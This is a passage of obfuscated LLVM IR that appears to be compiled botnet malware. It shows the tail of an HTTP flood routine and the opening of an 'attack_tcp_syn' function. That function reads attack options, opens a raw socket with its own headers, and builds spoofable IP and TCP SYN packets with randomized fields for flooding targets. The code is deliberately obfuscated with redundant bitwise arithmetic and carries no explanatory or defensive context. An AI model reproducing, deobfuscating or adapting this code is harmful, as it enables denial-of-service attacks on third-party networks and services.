  %2799 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2798, i32 0, i32 17
  %2800 = load i32, i32* %2799, align 4
  %2801 = sub i32 0, %2797
  %2802 = add i32 %2800, %2801
  %2803 = sub nsw i32 %2800, %2797
  store i32 %2802, i32* %2799, align 4
  %2804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2804, i32 0, i32 18
  %2806 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2805, i32 0, i32 0
  %2807 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2807, i32 0, i32 18
  %2809 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2808, i32 0, i32 0
  %2810 = load i32, i32* %59, align 4
  %2811 = sext i32 %2810 to i64
  %2812 = getelementptr inbounds i8, i8* %2809, i64 %2811
  %2813 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2814 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2813, i32 0, i32 17
  %2815 = load i32, i32* %2814, align 4
  %2816 = sext i32 %2815 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2806, i8* %2812, i64 %2816, i32 1, i1 false)
  %2817 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2818 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2817, i32 0, i32 18
  %2819 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2820 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2819, i32 0, i32 17
  %2821 = load i32, i32* %2820, align 4
  %2822 = sext i32 %2821 to i64
  %2823 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2818, i64 0, i64 %2822
  store i8 0, i8* %2823, align 1
  %2824 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2824, i32 0, i32 17
  %2826 = load i32, i32* %2825, align 4
  %2827 = icmp eq i32 %2826, 0
  br i1 %2827, label %2828, label %2829

; <label>:2828:                                   ; preds = %2796
  br label %2831

; <label>:2829:                                   ; preds = %2796
  br label %2830

; <label>:2830:                                   ; preds = %2829
  br label %2496

; <label>:2831:                                   ; preds = %2828, %2795, %2787, %2760, %2694
  br label %2411

; <label>:2832:                                   ; preds = %2483, %2417
  br label %2885

; <label>:2833:                                   ; preds = %2404
  %2834 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2835 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2834, i32 0, i32 1
  %2836 = load i8, i8* %2835, align 4
  %2837 = zext i8 %2836 to i32
  %2838 = icmp eq i32 %2837, 10
  br i1 %2838, label %2839, label %2884

; <label>:2839:                                   ; preds = %2833
  br label %2840

; <label>:2840:                                   ; preds = %2873, %2839
  %2841 = call i32* @__errno_location() #7
  store i32 0, i32* %2841, align 4
  %2842 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2843 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2842, i32 0, i32 0
  %2844 = load i32, i32* %2843, align 4
  %2845 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2846 = call i64 @recv(i32 %2844, i8* %2845, i64 10240, i32 16384)
  %2847 = trunc i64 %2846 to i32
  store i32 %2847, i32* %12, align 4
  %2848 = load i32, i32* %12, align 4
  %2849 = icmp eq i32 %2848, 0
  br i1 %2849, label %2850, label %2852

; <label>:2850:                                   ; preds = %2840
  %2851 = call i32* @__errno_location() #7
  store i32 104, i32* %2851, align 4
  store i32 -1, i32* %12, align 4
  br label %2852

; <label>:2852:                                   ; preds = %2850, %2840
  %2853 = load i32, i32* %12, align 4
  %2854 = icmp eq i32 %2853, -1
  br i1 %2854, label %2855, label %2873

; <label>:2855:                                   ; preds = %2852
  %2856 = call i32* @__errno_location() #7
  %2857 = load i32, i32* %2856, align 4
  %2858 = icmp ne i32 %2857, 11
  br i1 %2858, label %2859, label %2872

; <label>:2859:                                   ; preds = %2855
  %2860 = call i32* @__errno_location() #7
  %2861 = load i32, i32* %2860, align 4
  %2862 = icmp ne i32 %2861, 11
  br i1 %2862, label %2863, label %2872

; <label>:2863:                                   ; preds = %2859
  %2864 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2864, i32 0, i32 0
  %2866 = load i32, i32* %2865, align 4
  %2867 = call i32 @close(i32 %2866)
  %2868 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2869 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2868, i32 0, i32 0
  store i32 -1, i32* %2869, align 4
  %2870 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2871 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2870, i32 0, i32 1
  store i8 0, i8* %2871, align 4
  br label %2872

; <label>:2872:                                   ; preds = %2863, %2859, %2855
  br label %2874

; <label>:2873:                                   ; preds = %2852
  br label %2840

; <label>:2874:                                   ; preds = %2872
  %2875 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2876 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2875, i32 0, i32 1
  %2877 = load i8, i8* %2876, align 4
  %2878 = zext i8 %2877 to i32
  %2879 = icmp ne i32 %2878, 0
  br i1 %2879, label %2880, label %2883

; <label>:2880:                                   ; preds = %2874
  %2881 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2882 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2881, i32 0, i32 1
  store i8 1, i8* %2882, align 4
  br label %2883

; <label>:2883:                                   ; preds = %2880, %2874
  br label %2884

; <label>:2884:                                   ; preds = %2883, %2833
  br label %2885

; <label>:2885:                                   ; preds = %2884, %2832
  br label %2886

; <label>:2886:                                   ; preds = %2885, %2395
  br label %2887

; <label>:2887:                                   ; preds = %2886, %1229
  br label %2888

; <label>:2888:                                   ; preds = %2887, %2355, %1959, %1281, %1264, %1219, %1184
  %2889 = load i32, i32* %9, align 4
  %2890 = sub i32 %2889, -1755587609
  %2891 = add i32 %2890, 1
  %2892 = add i32 %2891, -1755587609
  %2893 = add nsw i32 %2889, 1
  store i32 %2892, i32* %9, align 4
  br label %1171

; <label>:2894:                                   ; preds = %1171
  br label %453

; <label>:2895:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

declare i64 @send(i32, i8*, i64, i32) #4

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %641

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %641

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %456, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %463

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 -39, -1
  %137 = or i8 %134, %135
  %138 = or i8 -39, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = and i8 %140, 64
  %143 = xor i8 %140, 64
  %144 = or i8 %142, %143
  %145 = or i8 %140, 64
  store i8 %144, i8* %132, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = xor i8 %148, -1
  %150 = xor i8 -16, -1
  %151 = xor i8 83, -1
  %152 = or i8 %149, %150
  %153 = or i8 83, %151
  %154 = xor i8 %152, -1
  %155 = and i8 %154, %153
  %156 = and i8 %148, -16
  %157 = xor i8 %155, -1
  %158 = xor i8 5, -1
  %159 = xor i8 -76, -1
  %160 = and i8 %157, -76
  %161 = and i8 %155, %159
  %162 = and i8 %158, -76
  %163 = and i8 5, %159
  %164 = or i8 %160, %161
  %165 = or i8 %162, %163
  %166 = xor i8 %164, %165
  %167 = or i8 %157, %158
  %168 = xor i8 %167, -1
  %169 = or i8 -76, %159
  %170 = and i8 %168, %169
  %171 = or i8 %166, %170
  %172 = or i8 %155, 5
  store i8 %171, i8* %147, align 4
  %173 = load i8, i8* %12, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 1
  store i8 %173, i8* %175, align 1
  %176 = call zeroext i16 @htons(i16 zeroext 60) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %113
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %113
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = xor i16 %222, -1
  %224 = xor i16 -241, -1
  %225 = xor i16 27574, -1
  %226 = or i16 %223, %224
  %227 = or i16 27574, %225
  %228 = xor i16 %226, -1
  %229 = and i16 %228, %227
  %230 = and i16 %222, -241
  %231 = xor i16 %229, -1
  %232 = xor i16 160, -1
  %233 = xor i16 -4236, -1
  %234 = and i16 %231, -4236
  %235 = and i16 %229, %233
  %236 = and i16 %232, -4236
  %237 = and i16 160, %233
  %238 = or i16 %234, %235
  %239 = or i16 %236, %237
  %240 = xor i16 %238, %239
  %241 = or i16 %231, %232
  %242 = xor i16 %241, -1
  %243 = or i16 -4236, %233
  %244 = and i16 %242, %243
  %245 = or i16 %240, %244
  %246 = or i16 %229, 160
  store i16 %245, i16* %221, align 4
  %247 = load i8, i8* %20, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = xor i16 1, -1
  %253 = xor i16 %248, %252
  %254 = and i16 %253, %248
  %255 = and i16 %248, 1
  %256 = shl i16 %254, 13
  %257 = xor i16 -8193, -1
  %258 = xor i16 %251, %257
  %259 = and i16 %258, %251
  %260 = and i16 %251, -8193
  %261 = xor i16 %259, -1
  %262 = xor i16 %256, -1
  %263 = xor i16 10956, -1
  %264 = and i16 %261, 10956
  %265 = and i16 %259, %263
  %266 = and i16 %262, 10956
  %267 = and i16 %256, %263
  %268 = or i16 %264, %265
  %269 = or i16 %266, %267
  %270 = xor i16 %268, %269
  %271 = or i16 %261, %262
  %272 = xor i16 %271, -1
  %273 = or i16 10956, %263
  %274 = and i16 %272, %273
  %275 = or i16 %270, %274
  %276 = or i16 %259, %256
  store i16 %275, i16* %250, align 4
  %277 = load i8, i8* %21, align 1
  %278 = sext i8 %277 to i16
  %279 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %280 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %279, i32 0, i32 4
  %281 = load i16, i16* %280, align 4
  %282 = xor i16 %278, -1
  %283 = xor i16 1, -1
  %284 = xor i16 29736, -1
  %285 = or i16 %282, %283
  %286 = or i16 29736, %284
  %287 = xor i16 %285, -1
  %288 = and i16 %287, %286
  %289 = and i16 %278, 1
  %290 = shl i16 %288, 12
  %291 = xor i16 %281, -1
  %292 = xor i16 -4097, -1
  %293 = xor i16 6578, -1
  %294 = or i16 %291, %292
  %295 = or i16 6578, %293
  %296 = xor i16 %294, -1
  %297 = and i16 %296, %295
  %298 = and i16 %281, -4097
  %299 = xor i16 %297, -1
  %300 = xor i16 %290, -1
  %301 = xor i16 -18941, -1
  %302 = and i16 %299, -18941
  %303 = and i16 %297, %301
  %304 = and i16 %300, -18941
  %305 = and i16 %290, %301
  %306 = or i16 %302, %303
  %307 = or i16 %304, %305
  %308 = xor i16 %306, %307
  %309 = or i16 %299, %300
  %310 = xor i16 %309, -1
  %311 = or i16 -18941, %301
  %312 = and i16 %310, %311
  %313 = or i16 %308, %312
  %314 = or i16 %297, %290
  store i16 %313, i16* %280, align 4
  %315 = load i8, i8* %22, align 1
  %316 = sext i8 %315 to i16
  %317 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %318 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %317, i32 0, i32 4
  %319 = load i16, i16* %318, align 4
  %320 = xor i16 1, -1
  %321 = xor i16 %316, %320
  %322 = and i16 %321, %316
  %323 = and i16 %316, 1
  %324 = shl i16 %322, 11
  %325 = xor i16 -2049, -1
  %326 = xor i16 %319, %325
  %327 = and i16 %326, %319
  %328 = and i16 %319, -2049
  %329 = and i16 %327, %324
  %330 = xor i16 %327, %324
  %331 = or i16 %329, %330
  %332 = or i16 %327, %324
  store i16 %331, i16* %318, align 4
  %333 = load i8, i8* %23, align 1
  %334 = sext i8 %333 to i16
  %335 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %336 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %335, i32 0, i32 4
  %337 = load i16, i16* %336, align 4
  %338 = xor i16 %334, -1
  %339 = xor i16 1, -1
  %340 = xor i16 -31177, -1
  %341 = or i16 %338, %339
  %342 = or i16 -31177, %340
  %343 = xor i16 %341, -1
  %344 = and i16 %343, %342
  %345 = and i16 %334, 1
  %346 = shl i16 %344, 10
  %347 = xor i16 -1025, -1
  %348 = xor i16 %337, %347
  %349 = and i16 %348, %337
  %350 = and i16 %337, -1025
  %351 = and i16 %349, %346
  %352 = xor i16 %349, %346
  %353 = or i16 %351, %352
  %354 = or i16 %349, %346
  store i16 %353, i16* %336, align 4
  %355 = load i8, i8* %24, align 1
  %356 = sext i8 %355 to i16
  %357 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 4
  %359 = load i16, i16* %358, align 4
  %360 = xor i16 1, -1
  %361 = xor i16 %356, %360
  %362 = and i16 %361, %356
  %363 = and i16 %356, 1
  %364 = shl i16 %362, 9
  %365 = xor i16 -513, -1
  %366 = xor i16 %359, %365
  %367 = and i16 %366, %359
  %368 = and i16 %359, -513
  %369 = and i16 %367, %364
  %370 = xor i16 %367, %364
  %371 = or i16 %369, %370
  %372 = or i16 %367, %364
  store i16 %371, i16* %358, align 4
  %373 = load i8, i8* %25, align 1
  %374 = sext i8 %373 to i16
  %375 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %376 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %375, i32 0, i32 4
  %377 = load i16, i16* %376, align 4
  %378 = xor i16 1, -1
  %379 = xor i16 %374, %378
  %380 = and i16 %379, %374
  %381 = and i16 %374, 1
  %382 = shl i16 %380, 8
  %383 = xor i16 %377, -1
  %384 = xor i16 -257, -1
  %385 = xor i16 31137, -1
  %386 = or i16 %383, %384
  %387 = or i16 31137, %385
  %388 = xor i16 %386, -1
  %389 = and i16 %388, %387
  %390 = and i16 %377, -257
  %391 = xor i16 %389, -1
  %392 = xor i16 %382, -1
  %393 = xor i16 21868, -1
  %394 = and i16 %391, 21868
  %395 = and i16 %389, %393
  %396 = and i16 %392, 21868
  %397 = and i16 %382, %393
  %398 = or i16 %394, %395
  %399 = or i16 %396, %397
  %400 = xor i16 %398, %399
  %401 = or i16 %391, %392
  %402 = xor i16 %401, -1
  %403 = or i16 21868, %393
  %404 = and i16 %402, %403
  %405 = or i16 %400, %404
  %406 = or i16 %389, %382
  store i16 %405, i16* %376, align 4
  %407 = load i8*, i8** %29, align 8
  %408 = getelementptr inbounds i8, i8* %407, i32 1
  store i8* %408, i8** %29, align 8
  store i8 2, i8* %407, align 1
  %409 = load i8*, i8** %29, align 8
  %410 = getelementptr inbounds i8, i8* %409, i32 1
  store i8* %410, i8** %29, align 8
  store i8 4, i8* %409, align 1
  %411 = call i32 @rand_next()
  %412 = xor i32 %411, -1
  %413 = xor i32 15, -1
  %414 = xor i32 -797610033, -1
  %415 = or i32 %412, %413
  %416 = or i32 -797610033, %414
  %417 = xor i32 %415, -1
  %418 = and i32 %417, %416
  %419 = and i32 %411, 15
  %420 = sub i32 0, 1400
  %421 = sub i32 0, %418
  %422 = add i32 %420, %421
  %423 = sub i32 0, %422
  %424 = add i32 1400, %418
  %425 = trunc i32 %423 to i16
  %426 = call zeroext i16 @htons(i16 zeroext %425) #7
  %427 = load i8*, i8** %29, align 8
  %428 = bitcast i8* %427 to i16*
  store i16 %426, i16* %428, align 2
  %429 = load i8*, i8** %29, align 8
  %430 = getelementptr inbounds i8, i8* %429, i64 2
  store i8* %430, i8** %29, align 8
  %431 = load i8*, i8** %29, align 8
  %432 = getelementptr inbounds i8, i8* %431, i32 1
  store i8* %432, i8** %29, align 8
  store i8 4, i8* %431, align 1
  %433 = load i8*, i8** %29, align 8
  %434 = getelementptr inbounds i8, i8* %433, i32 1
  store i8* %434, i8** %29, align 8
  store i8 2, i8* %433, align 1
  %435 = load i8*, i8** %29, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %29, align 8
  store i8 8, i8* %435, align 1
  %437 = load i8*, i8** %29, align 8
  %438 = getelementptr inbounds i8, i8* %437, i32 1
  store i8* %438, i8** %29, align 8
  store i8 10, i8* %437, align 1
  %439 = call i32 @rand_next()
  %440 = load i8*, i8** %29, align 8
  %441 = bitcast i8* %440 to i32*
  store i32 %439, i32* %441, align 4
  %442 = load i8*, i8** %29, align 8
  %443 = getelementptr inbounds i8, i8* %442, i64 4
  store i8* %443, i8** %29, align 8
  %444 = load i8*, i8** %29, align 8
  %445 = bitcast i8* %444 to i32*
  store i32 0, i32* %445, align 4
  %446 = load i8*, i8** %29, align 8
  %447 = getelementptr inbounds i8, i8* %446, i64 4
  store i8* %447, i8** %29, align 8
  %448 = load i8*, i8** %29, align 8
  %449 = getelementptr inbounds i8, i8* %448, i32 1
  store i8* %449, i8** %29, align 8
  store i8 1, i8* %448, align 1
  %450 = load i8*, i8** %29, align 8
